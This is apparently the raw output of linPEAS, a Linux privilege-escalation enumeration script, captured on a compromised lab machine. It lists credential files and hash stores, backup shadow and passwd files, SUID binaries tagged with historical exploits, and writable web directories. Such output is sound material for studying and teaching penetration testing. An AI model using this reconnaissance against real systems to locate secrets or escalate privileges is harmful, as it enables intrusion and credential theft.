+/etc/apache2/mods-enabled/php5.conf-<IfModule mod_php5.c>
+/etc/apache2/mods-enabled/php5.conf:  AddType application/x-httpd-php .php .phtml .php3
+/etc/apache2/mods-enabled/php5.conf:  AddType application/x-httpd-php-source .phps
+
+[+] Searching PHPCookies
+ Not Found
+
+[+] Searching Wordpress wp-config.php files
+wp-config.php Not Found
+
+[+] Searching Drupal settings.php files
+/default/settings.php Not Found
+
+[+] Searching Moodle config.php files
+config.php inside a moodle folder Not Found
+
+[+] Searching Tomcat users file
+tomcat-users.xml Not Found
+
+[+] Mongo information
+mongo binary Not Found
+
+[+] Searching supervisord configuration file
+supervisord.conf Not Found
+
+[+] Searching cesi configuration file
+cesi.conf Not Found
+
+[+] Searching Rsyncd config file
+rsyncd.conf Not Found
+[+] Searching Hostapd config file
+hostapd.conf Not Found
+
+[+] Searching wifi conns file
+ Not Found
+
+[+] Searching Anaconda-ks config files
+anaconda-ks.cfg Not Found
+
+[+] Searching .vnc directories and their passwd files
+.vnc Not Found
+
+[+] Searching ldap directories and their hashes
+/etc/ldap
+The password hash is from the {SSHA} to 'structural'
+
+[+] Searching .ovpn files and credentials
+.ovpn Not Found
+
+[+] Searching ssl/ssh files
+Port 22
+PermitRootLogin yes
+PubkeyAuthentication yes
+PermitEmptyPasswords no
+ChallengeResponseAuthentication no
+UsePAM yes
+ --> /etc/hosts.allow file found, read the rules:
+/etc/hosts.allow
+
+
+Searching inside /etc/ssh/ssh_config for interesting info
+Host *
+    SendEnv LANG LC_*
+    HashKnownHosts yes
+    GSSAPIAuthentication yes
+    GSSAPIDelegateCredentials no
+
+[+] Searching unexpected auth lines in /etc/pam.d/sshd
+No
+
+[+] Searching Cloud credentials (AWS, Azure, GC)
+
+[+] NFS exports?
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe
+/etc/exports Not Found
+
+[+] Searching kerberos conf files and tickets
+[i] https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88#pass-the-ticket-ptt
+tickets kerberos Not Found
+klist Not Found
+
+[+] Searching Kibana yaml
+kibana.yml Not Found
+
+[+] Searching Knock configuration
+Knock.config Not Found
+
+[+] Searching logstash files
+ Not Found
+
+[+] Searching elasticsearch files
+ Not Found
+
+[+] Searching Vault-ssh files
+vault-ssh-helper.hcl Not Found
+
+[+] Searching AD cached hashes
+-rw------- 1 root root 8192 Apr 24  2008 /var/lib/samba/passdb.tdb
+
+[+] Searching screen sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+screen Not Found
+
+[+] Searching tmux sessions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-shell-sessions
+tmux Not Found
+
+[+] Searching Couchdb directory
+
+[+] Searching redis.conf
+
+[+] Searching dovecot files
+Found possible PLAIN text creds in /etc/dovecot/dovecot-sql-example.conf
+#default_pass_scheme
+Found possible PLAIN text creds in =
+=
+Found possible PLAIN text creds in PLAIN-MD5
+PLAIN-MD5
+
+[+] Searching mosquitto.conf
+
+[+] Searching neo4j auth file
+
+[+] Searching Cloud-Init conf file
+
+[+] Searching Erlang cookie file
+
+[+] Searching GVM auth file
+
+[+] Searching IPSEC files
+
+[+] Searching IRSSI files
+
+[+] Searching Keyring files
+Keyring folder: /usr/share/keyrings
+/usr/share/keyrings:
+total 4
+-rw-r--r-- 1 root root 2393 Jun 11  2007 ubuntu-archive-keyring.gpg
+-rw------- 1 root root    0 Apr 24  2008 ubuntu-archive-removed-keys.gpg
+
+[+] Searching Filezilla sites file
+
+[+] Searching backup-manager files
+
+[+] Searching uncommon passwd files (splunk)
+
+[+] Searching GitLab related files
+
+
+[+] Searching PGP/GPG
+PGP/GPG software:
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Searching vim files
+
+[+] Checking if containerd(ctr) is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/containerd-ctr-privilege-escalation
+
+[+] Checking if runc is available
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+
+[+] Searching docker files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-docker-socket
+
+[+] Interesting Firefox Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Interesting Chrome Files
+[i] https://book.hacktricks.xyz/forensics/basic-forensics-esp/browser-artifacts#firefox
+
+[+] Autologin Files
+
+[+] S/Key authentication
+
+[+] YubiKey authentication
+
+[+] Passwords inside pam.d
+
+[+] FastCGI Params
+
+[+] SNMPs
+
+
+
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+[+] SUID - Check easy privesc, exploits and write perms
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+strings Not Found
+-rwsr-sr-x 1 daemon daemon    38K Feb 20  2007 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
+-rwsr-sr-x 1 root   mail      71K Mar 27  2007 /usr/bin/procmail
+-rwsr-xr-x 1 root   root      29K May 18  2007 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
+-rwsr-xr-x 1 root   root      37K May 18  2007 /usr/bin/gpasswd
+-rwsr-xr-x 1 root   root      24K May 18  2007 /usr/bin/chsh
+-rwsr-xr-x 1 root   root      32K May 18  2007 /usr/bin/chfn  --->  SuSE_9.3/10
+-rwsr-xr-x 1 root   root      20K May 18  2007 /usr/bin/newgrp  --->  HP-UX_10.20
+-rwsr-xr-x 1 root   root      27K May 18  2007 /bin/su
+-rwsr-xr-x 1 root   root      45K May 30  2007 /usr/bin/mtr
+-rwsr-xr-x 1 root   root     4.5K Jun 14  2007 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-x 2 root   root      90K Jun 15  2007 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerableedit
+-rwsr-xr-x 2 root   root      90K Jun 15  2007 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
+-rwsr-xr-x 1 root   root      13K Jul  6  2007 /usr/bin/traceroute6.iputils
+-rwsr-xr-x 1 root   root      11K Jul  6  2007 /usr/bin/arping
+-rwsr-xr-x 1 root   root      27K Jul  6  2007 /bin/ping6
+-rwsr-xr-x 1 root   root      31K Jul  6  2007 /bin/ping
+-rwsr-xr-x 1 root   root     3.4K Aug  1  2007 /bin/check-foreground-console
+-rwsr-xr-- 1 root   dhcp     2.9K Sep  7  2007 /lib/dhcp3-client/call-dhclient-script (Unknown SUID binary)
+-rwsr-xr-- 1 root   fuse      20K Sep 18  2007 /bin/fusermount
+-rwsr-xr-x 1 root   root     9.4K Sep 30  2007 /usr/lib/pt_chown  --->  GNU_glibc_2.1/2.1.1_-6(08-1999)
+-rwsr-xr-x 1 root   root      60K Oct  3  2007 /bin/umount  --->  BSD/Linux(08-1996)
+-rwsr-xr-x 1 root   root      79K Oct  3  2007 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
+-rwsr-sr-x 1 root   root     6.4K Oct  4  2007 /usr/bin/smbumount
+-rwsr-xr-x 1 root   root     9.7K Oct  4  2007 /usr/bin/smbmnt
+-rwsr-xr-x 1 root   root     9.1K Oct  4  2007 /sbin/umount.cifs
+-rwsr-xr-x 1 root   root      23K Oct  4  2007 /sbin/mount.cifs
+-rwsr-xr-- 1 root   dip      263K Oct  4  2007 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
+-rwsr-xr-x 1 root   root     165K Oct  4  2007 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-- 1 root   www-data  11K Oct  4  2007 /usr/lib/apache2/suexec
+-r-sr-xr-x 1 root   root      14K Jan 17  2018 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+-r-sr-xr-x 1 root   root     9.4K Jan 17  2018 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+
+[+] SGID
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+-rwxr-sr-x 1 root   crontab  27K Dec 20  2006 /usr/bin/crontab
+-rwsr-sr-x 1 daemon daemon   38K Feb 20  2007 /usr/bin/at
+-rwsr-sr-x 1 root   mail     71K Mar 27  2007 /usr/bin/procmail
+-rwxr-sr-x 1 root   mail     13K Mar 27  2007 /usr/bin/lockfile
+-rwxr-sr-x 1 root   tty     7.7K May 15  2007 /usr/bin/bsd-write
+-rwxr-sr-x 1 root   shadow   19K May 18  2007 /usr/bin/expiry
+-rwxr-sr-x 1 root   shadow   38K May 18  2007 /usr/bin/chage
+-rwxr-sr-x 1 root   mail     11K Jun  7  2007 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root   mail    7.6K Sep 21  2007 /usr/bin/mutt_dotlock
+-rwxr-sr-x 1 root   shadow   21K Oct  1  2007 /sbin/unix_chkpwd
+-rwxr-sr-x 1 root   tty     9.8K Oct  3  2007 /usr/bin/wall
+-rwsr-sr-x 1 root   root    6.4K Oct  4  2007 /usr/bin/smbumount
+-rwxr-sr-x 1 root   ssh      79K Oct  4  2007 /usr/bin/ssh-agent
+
+[+] Checking misconfigurations of ld.so
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#ld-so
+/etc/ld.so.conf
+include /etc/ld.so.conf.d/*.conf
+
+/etc/ld.so.conf.d
+  /etc/ld.so.conf.d/i486-linux-gnu
+/lib/i486-linux-gnu
+/usr/lib/i486-linux-gnu
+  /etc/ld.so.conf.d/libc.conf
+/usr/local/lib
+  /etc/ld.so.conf.d/vmware-tools-libraries.conf
+/usr/lib/vmware-tools/lib32/libvmGuestLib.so
+/usr/lib/vmware-tools/lib64/libvmGuestLib.so
+/usr/lib/vmware-tools/lib32/libvmGuestLibJava.so
+/usr/lib/vmware-tools/lib64/libvmGuestLibJava.so
+/usr/lib/vmware-tools/lib32/libDeployPkg.so
+/usr/lib/vmware-tools/lib64/libDeployPkg.so
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+Current capabilities:
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+
+Shell capabilities:
+capsh Not Found
+CapInh: 0000000000000000
+CapPrm: 0000000000000000
+CapEff: 0000000000000000
+
+Files with capabilities (limited to 50):
+
+[+] Users with capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/etc/security/capability.conf Not Found
+
+[+] Files with ACLs (limited to 50)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#acls
+files with acls in searched folders Not Found
+
+[+] .sh files in path
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
+/usr/bin/gettext.sh
+
+[+] Unexpected in root
+/vmlinuz
+/initrd.img
+/.rnd
+/initrd
+/lost+found
+
+[+] Files (scripts) in /etc/profile.d/
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#profiles-files
+
+[+] Permissions in init, init.d, systemd, and rc.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#init-init-d-systemd-and-rc-d
+
+[+] Hashes inside passwd file? ........... No
+[+] Writable passwd file? ................ No
+[+] Credentials in fstab/mtab? ........... No
+[+] Can I read shadow files? ............. No
+[+] Can I read opasswd file? ............. No
+[+] Can I write in network-scripts? ...... No
+[+] Can I read root folder? .............. total 28
+drwxr-xr-x  3 root root 4096 May 26 01:20 .
+drwxr-xr-x 21 root root 4096 Apr 24  2008 ..
+-rw-------  1 root root    0 Sep  3  2020 .bash_history
+-rw-r--r--  1 root root 2448 Apr 19  2016 .bashrc
+-rw-r--r--  1 root root  141 May 15  2007 .profile
+drwxr-xr-x  2 root root 4096 Sep 24  2008 .ssh
+-rw-r--r--  1 root root 2296 Mar 30  2017 capture.cap
+----------  1 root root   33 May 26 01:21 proof.txt
+
+[+] Searching root files in home dirs (limit 30)
+/home/
+/root/
+/root/.ssh
+/root/.ssh/authorized_keys
+/root/capture.cap
+/root/.profile
+/root/.bashrc
+/root/proof.txt
+/root/.bash_history
+/usr/sbin
+/usr/sbin/pam_getenv
+/usr/sbin/mklost+found
+/usr/sbin/aa-autodep
+/usr/sbin/aa-unconfined
+/usr/sbin/rootflags
+/usr/sbin/grpconv
+/usr/sbin/grub-floppy
+/usr/sbin/aa-audit
+/usr/sbin/invoke-rc.d
+/usr/sbin/chat
+/usr/sbin/mksmbpasswd
+/usr/sbin/vidmode
+/usr/sbin/arp
+/usr/sbin/addgroup
+/usr/sbin/rotatelogs
+/usr/sbin/mkinitramfs
+/usr/sbin/delgroup
+/usr/sbin/split-logfile
+/usr/sbin/grpunconv
+/usr/sbin/audit
+
+[+] Searching folders owned by me containing others files on it
+
+[+] Readable files belonging to root and readable by me but not world readable
+
+[+] Modified interesting files in the last 5mins (limit 100)
+/var/log/syslog
+/var/log/auth.log
+/var/www/.gnupg/gpg.conf
+/var/www/.gnupg/pubring.gpg
+/var/www/.gnupg/trustdb.gpg
+
+[+] Writable log files (logrotten) (limit 100)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitation
+logrotate Not Found
+
+[+] Files inside /home/www-data (limit 20)
+
+[+] Files inside others home (limit 20)
+/home/patrick/local.txt
+/home/patrick/.bash_logout
+/home/patrick/.profile
+/home/patrick/.bashrc
+/home/patrick/.bash_history
+/root/.ssh/authorized_keys
+/root/capture.cap
+/root/.profile
+/root/.bashrc
+/root/proof.txt
+/root/.bash_history
+/usr/sbin/pam_getenv
+/usr/sbin/mklost+found
+/usr/sbin/grpconv
+/usr/sbin/grub-floppy
+/usr/sbin/invoke-rc.d
+/usr/sbin/chat
+/usr/sbin/mksmbpasswd
+/usr/sbin/arp
+/usr/sbin/rotatelogs
+
+[+] Searching installed mail applications
+dovecot
+postfix
+maildirmake.dovecot
+dovecot
+
+[+] Mails (limit 50)
+
+[+] Backup folders
+drwxr-xr-x 2 root root 4096 Aug 27  2009 /var/backups
+total 300
+-rw-r--r-- 1 root root   279279 Apr 24  2008 dpkg.status.0
+-rw------- 1 root root      754 Apr 12  2016 group.bak
+-rw------- 1 root shadow    629 Apr 12  2016 gshadow.bak
+-rw-r--r-- 1 root root     1833 Apr 24  2008 infodir.bak
+-rw------- 1 root root     1118 Apr 12  2016 passwd.bak
+-rw------- 1 root shadow    761 Apr 12  2016 shadow.bak
+
+drwxr-xr-x 2 patrick patrick 4096 Aug 31  2006 /var/www/var/database/backup
+total 0
+
+drwxr-xr-x 2 root root 4096 Aug 27  2009 /var/backups
+total 300
+-rw-r--r-- 1 root root   279279 Apr 24  2008 dpkg.status.0
+-rw------- 1 root root      754 Apr 12  2016 group.bak
+-rw------- 1 root shadow    629 Apr 12  2016 gshadow.bak
+-rw-r--r-- 1 root root     1833 Apr 24  2008 infodir.bak
+-rw------- 1 root root     1118 Apr 12  2016 passwd.bak
+-rw------- 1 root shadow    761 Apr 12  2016 shadow.bak
+
+drwxr-xr-x 2 patrick patrick 4096 Aug 31  2006 /var/www/var/database/backup
+total 0
+
+
+[+] Backup files (limited 100)
+-rw-r--r-- 1 root root 198 Apr 24  2008 /var/lib/belocs/hashfile.old
+-rw-r--r-- 1 root root 1833 Apr 24  2008 /var/backups/infodir.bak
+-rw-r--r-- 1 patrick patrick 25227 Jul 27  2015 /var/www/include/admin/statistics.php.bak
+-rwxr-xr-x 1 root root 34632 Jan 17  2018 /usr/lib/vmware-tools/plugins64/vmsvc/libvmbackup.so
+-rw-r--r-- 1 root root 160 Feb 28  2015 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.3
+-rw-r--r-- 1 root root 160 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.4
+-rw-r--r-- 1 root root 11446 Sep 29  2011 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangox.aliases.old.0
+-rw-r--r-- 1 root root 160 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.1
+-rw-r--r-- 1 root root 160 Sep 29  2011 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.0
+-rw-r--r-- 1 root root 160 Jan  8  2013 /usr/lib/vmware-tools/lib32/libconf/etc/pango/pangorc.old.2
+-rw-r--r-- 1 root root 2087 Jan  8  2013 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.2
+-rw-r--r-- 1 root root 2087 Feb 28  2015 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.3
+-rw-r--r-- 1 root root 3939 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.1
+-rw-r--r-- 1 root root 2087 Aug  8  2012 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.1
+-rw-r--r-- 1 root root 3939 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.4
+-rw-r--r-- 1 root root 3939 Jan  8  2013 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.2
+-rw-r--r-- 1 root root 3326 Sep 29  2011 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.0
+-rw-r--r-- 1 root root 2087 Jan 17  2018 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.4
+-rw-r--r-- 1 root root 3939 Feb 28  2015 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gdk-pixbuf.loaders.old.3
+-rw-r--r-- 1 root root 1941 Sep 29  2011 /usr/lib/vmware-tools/lib32/libconf/etc/gtk-2.0/gtk.immodules.old.0
+-rwxr-xr-x 1 root root 29888 Jan 17  2018 /usr/lib/vmware-tools/plugins32/vmsvc/libvmbackup.so
+-rwxr-xr-x 1 root root 107 Oct 12  2007 /usr/share/mysql/mysql-test/t/backup-master.sh
+-rw-r--r-- 1 root root 1669 Oct 12  2007 /usr/share/mysql/mysql-test/t/backup.test
+-rw-r--r-- 1 root root 508 Oct 12  2007 /usr/share/mysql/mysql-test/include/ndb_backup_print.inc
+-rw-r--r-- 1 root root 955 Oct 12  2007 /usr/share/mysql/mysql-test/include/ndb_backup.inc
+-rw-r--r-- 1 root root 2034 Oct 12  2007 /usr/share/mysql/mysql-test/r/backup.result
+-rw-r--r-- 1 root root 1747 Apr 24  2008 /usr/share/info/dir.old
+-rw-r--r-- 1 root root 1151 Oct  4  2007 /usr/share/man/man8/tdbbackup.8.gz
+-rw-r--r-- 1 root root 7885 Dec 17  2006 /usr/share/doc/telnet/README.telnet.old.gz
+-rw-r--r-- 1 root root 3660 Jun 19  2007 /usr/share/doc/samba-doc/htmldocs/manpages/tdbbackup.8.html
+-rw-r--r-- 1 root root 317 Jun 14  2007 /usr/share/doc/hdparm/changelog.old.gz
+-rw-r--r-- 1 root root 51044 Jun 20  2007 /usr/share/doc/manpages/Changes.old.gz
+-rw-r--r-- 1 root root 111911 Sep 21  2007 /usr/share/doc/mutt/changelog.old.gz
+-rw-r--r-- 1 root root 2871 Sep 21  2007 /usr/share/doc/mutt/NEWS.old.gz
+-rw-r--r-- 1 root root 207 Feb 28  2015 /etc/vmware-tools/vmware-user.desktop.old.3
+-rw-r--r-- 1 root root 339 Aug  8  2012 /etc/vmware-tools/vmware-user.desktop.old.1
+-rw-r--r-- 1 root root 207 Jan 17  2018 /etc/vmware-tools/vmware-user.desktop.old.4
+-rw-r--r-- 1 root root 339 Jan  8  2013 /etc/vmware-tools/vmware-user.desktop.old.2
+-rw-r--r-- 1 root root 136 Sep 29  2011 /etc/vmware-tools/vmware-user.desktop.old.0
+-rw-r--r-- 1 root root 726 Sep 16  2008 /etc/fstab.old.0
+-rw-r--r-- 1 root root 248 Apr 24  2008 /etc/blkid.tab.old
+-rw-r--r-- 1 root root 1051 Sep 29  2011 /etc/updatedb.conf.old.2
+-rw-r--r-- 1 root root 43021 Apr 24  2008 /etc/dovecot/dovecot.conf.bak
+-rw-r--r-- 1 root root 1051 Sep  4  2011 /etc/updatedb.conf.old.1
+-rw-r--r-- 1 root root 1051 Sep 16  2008 /etc/updatedb.conf.old.0
+-rw-r--r-- 1 root root 191 Aug  8  2012 /etc/initramfs-tools/modules.old.2
+-rw-r--r-- 1 root root 191 Jan  8  2013 /etc/initramfs-tools/modules.old.3
+-rw-r--r-- 1 root root 191 Jan 17  2018 /etc/initramfs-tools/modules.old.5
+-rw-r--r-- 1 root root 191 Feb 28  2015 /etc/initramfs-tools/modules.old.4
+-rw-r--r-- 1 root root 300 Sep  4  2011 /etc/initramfs-tools/modules.old.1
+-rw-r--r-- 1 root root 300 Sep 16  2008 /etc/initramfs-tools/modules.old.0
+-rw-r--r-- 1 root root 7091185 Jan 17  2018 /boot/initrd.img-2.6.22-14-server.bak
+
+[+] Searching tables inside readable .db/.sql/.sqlite files (limit 100)
+
+[+] Web files?(output limit)
+/var/www/:
+total 152K
+drwxrwxrwx 16 root     root     4.0K May 26 04:16 .
+drwxr-xr-x 14 root     root     4.0K Apr 24  2008 ..
+drwx------  2 www-data www-data 4.0K May 26 04:16 .gnupg
+-rw-r--r--  1 patrick  patrick     1 Jul 27  2015 Thumbs.db
+drwxr-xr-x 12 patrick  patrick  4.0K Jul 27  2015 addons
+-rw-r--r--  1 patrick  patrick  1.5K Jul 27  2015 admin.php
+drwxr-xr-x  2 root     root     4.0K Jul 27  2015 apache2-default
+drwxr-xr-x  2 patrick  patrick  4.0K Aug 31  2006 catalog
+
+[+] Readable hidden interesting files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#read-sensitive-data
+
+[+] All hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
+-rw-r--r-- 1 root root 34 Apr 24  2008 /var/lib/python-support/python2.5/.path
+-rw-r--r-- 1 patrick patrick 14 Jul 27  2015 /var/www/include/.htaccess
+-rw-r--r-- 1 patrick patrick 15 Jul 27  2015 /var/www/addons/.htaccess
+-rw-r--r-- 1 patrick patrick 14 Jul 27  2015 /var/www/var/database/.htaccess
+-rw-r--r-- 1 patrick patrick 33 Jul 27  2015 /var/www/var/.htaccess
+-rw-r--r-- 1 patrick patrick 76 Jul 27  2015 /var/www/var/skins_repository/.htaccess
+-rw-r--r-- 1 patrick patrick 14 Jul 27  2015 /var/www/targets/.htaccess
+-rw-r--r-- 1 patrick patrick 14 Jul 27  2015 /var/www/core/.htaccess
+-rw-r--r-- 1 patrick patrick 17 Jul 27  2015 /var/www/payments/.htaccess
+-rw-r--r-- 1 patrick patrick 17 Jul 27  2015 /var/www/images/.htaccess
+-rw-r--r-- 1 patrick patrick 14 Jul 27  2015 /var/www/shippings/.htaccess
+-rw-r--r-- 1 root root 0 Sep  9  2020 /dev/.initramfs-tools
+-rw------- 1 root root 1024 Apr 24  2008 /.rnd
+-rw-r--r-- 1 root root 2 Aug 29  2007 /usr/share/python-support/python-gnupginterface/.version
+-rw-r--r-- 1 root root 220 Oct  5  2007 /etc/skel/.bash_logout
+-rw------- 1 root root 0 Apr 24  2008 /etc/.pwd.lock
+-rw-r--r-- 1 root root 12288 Jun  8  2016 /etc/ssh/.sshd_config.swp
+-rw-r--r-- 1 patrick patrick 220 Apr 24  2008 /home/patrick/.bash_logout
+
+[+] Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
+-rw-r--r-- 1 root root 279279 Apr 24  2008 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 1833 Apr 24  2008 /var/backups/infodir.bak
+-rw-r--r-- 1 root root 279279 Apr 24  2008 /var/backups/dpkg.status.0
+-rw-r--r-- 1 root root 1833 Apr 24  2008 /var/backups/infodir.bak
+
+[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+/dev/shm
+/dev/shm/linpeas.sh
+/dev/shm/linpeas.txt
+/dev/shm/lse.sh
+/tmp
+/var/cache/apache2
+/var/cache/apache2/mod_disk_cache
+/var/lib/php5
+/var/lock
+/var/lock/apache2
+/var/spool/samba
+/var/tmp
+/var/www
+/var/www/.gnupg
+/var/www/.gnupg/gpg.conf
+/var/www/.gnupg/pubring.gpg
+/var/www/.gnupg/trustdb.gpg
+/var/www/config.php
+/var/www/images
+/var/www/skins
+/var/www/skins/default_blue
+/var/www/skins/default_blue/admin
+/var/www/skins/default_blue/admin/addons
+/var/www/skins/default_blue/admin/addons/ads
+/var/www/skins/default_blue/admin/addons/ads/ad_details.tpl
+/var/www/skins/default_blue/admin/addons/ads/ad_image.tpl
+/var/www/skins/default_blue/admin/addons/ads/ads.tpl
+/var/www/skins/default_blue/admin/addons/featured_products
+/var/www/skins/default_blue/admin/addons/featured_products/categories.tpl
+/var/www/skins/default_blue/admin/addons/manufacturers
+/var/www/skins/default_blue/admin/addons/manufacturers/manufacturer_details.tpl
+/var/www/skins/default_blue/admin/addons/manufacturers/manufacturer_image.tpl
+/var/www/skins/default_blue/admin/addons/manufacturers/manufacturers.tpl
+/var/www/skins/default_blue/admin/addons/news_and_emails
+/var/www/skins/default_blue/admin/addons/news_and_emails/news.tpl
+/var/www/skins/default_blue/admin/addons/news_and_emails/news_details.tpl
+/var/www/skins/default_blue/admin/addons/news_and_emails/newsletter_details.tpl
+/var/www/skins/default_blue/admin/addons/news_and_emails/newsletters.tpl
+/var/www/skins/default_blue/admin/addons/news_and_emails/site_subscribers.tpl
+/var/www/skins/default_blue/admin/addons/product_reviews
+/var/www/skins/default_blue/admin/addons/product_reviews/reviews.tpl
+/var/www/skins/default_blue/admin/addons/related_products
+/var/www/skins/default_blue/admin/addons/related_products/products.tpl
+/var/www/skins/default_blue/admin/addons/wholesale_trade
+/var/www/skins/default_blue/admin/addons/wholesale_trade/products.tpl
+/var/www/skins/default_blue/admin/auth_pages
+/var/www/skins/default_blue/admin/auth_pages/login.tpl
+/var/www/skins/default_blue/admin/auth_pages/logout.tpl
+/var/www/skins/default_blue/admin/auth_pages/recover_password.tpl
+/var/www/skins/default_blue/admin/bottom.tpl
+/var/www/skins/default_blue/admin/buttons
+/var/www/skins/default_blue/admin/buttons/add_empty_item.tpl
+/var/www/skins/default_blue/admin/buttons/add_new.tpl
+/var/www/skins/default_blue/admin/buttons/add_products.tpl
+/var/www/skins/default_blue/admin/buttons/button.tpl
+/var/www/skins/default_blue/admin/buttons/button_popup.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/categories_pages
+/var/www/skins/default_blue/admin/categories_pages/categories.tpl
+/var/www/skins/default_blue/admin/categories_pages/categories_m_add.tpl
+/var/www/skins/default_blue/admin/categories_pages/categories_m_update.tpl
+/var/www/skins/default_blue/admin/categories_pages/categories_m_viewadded.tpl
+/var/www/skins/default_blue/admin/categories_pages/categories_select_fields.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/common_templates
+/var/www/skins/default_blue/admin/common_templates/breadcrumbs.tpl
+/var/www/skins/default_blue/admin/common_templates/confirmation_dialog.tpl
+/var/www/skins/default_blue/admin/common_templates/confirmation_dialog_post.tpl
+/var/www/skins/default_blue/admin/common_templates/create_thumbnails.tpl
+/var/www/skins/default_blue/admin/common_templates/file_browser.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/content.tpl
+/var/www/skins/default_blue/admin/demo_skin_selector.tpl
+/var/www/skins/default_blue/admin/discounts_pages
+/var/www/skins/default_blue/admin/discounts_pages/categories_tree.tpl
+/var/www/skins/default_blue/admin/discounts_pages/discount_categories.tpl
+/var/www/skins/default_blue/admin/discounts_pages/discount_details.tpl
+/var/www/skins/default_blue/admin/discounts_pages/discount_global.tpl
+/var/www/skins/default_blue/admin/discounts_pages/discount_list.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
+/var/www/skins/default_blue/admin/exceptions_pages
+/var/www/skins/default_blue/admin/exceptions_pages/access_denied.tpl
+/var/www/skins/default_blue/admin/exceptions_pages/exceptions_list.tpl
+/var/www/skins/default_blue/admin/exceptions_pages/no_page.tpl
+/var/www/skins/default_blue/admin/exceptions_pages/no_product.tpl
+/var/www/skins/default_blue/admin/forms_pages
+/var/www/skins/default_blue/admin/forms_pages/form_elements.tpl
+/var/www/skins/default_blue/admin/forms_pages/forms.tpl
+/var/www/skins/default_blue/admin/html_catalog_pages
+/var/www/skins/default_blue/admin/html_catalog_pages/html_catalog.tpl
+/var/www/skins/default_blue/admin/images
+/var/www/skins/default_blue/admin/index.tpl
+/var/www/skins/default_blue/admin/js_menu
+/var/www/skins/default_blue/admin/js_menu/JSCookMenu.js
+/var/www/skins/default_blue/admin/js_menu/emenu.tpl
+/var/www/skins/default_blue/admin/js_menu/theme.css
+/var/www/skins/default_blue/admin/js_menu/theme.js
+/var/www/skins/default_blue/admin/locations
+/var/www/skins/default_blue/admin/locations/countries.tpl
+/var/www/skins/default_blue/admin/locations/destination_update.tpl
+/var/www/skins/default_blue/admin/locations/destinations.tpl
+/var/www/skins/default_blue/admin/locations/states.tpl
+/var/www/skins/default_blue/admin/look_n_feel_pages
+/var/www/skins/default_blue/admin/look_n_feel_pages/currencies.tpl
+/var/www/skins/default_blue/admin/look_n_feel_pages/index_page.tpl
+/var/www/skins/default_blue/admin/look_n_feel_pages/languages.tpl
+/var/www/skins/default_blue/admin/look_n_feel_pages/logs.tpl
+/var/www/skins/default_blue/admin/look_n_feel_pages/sections.tpl
+#)You_can_write_even_more_files_inside_last_directory
+
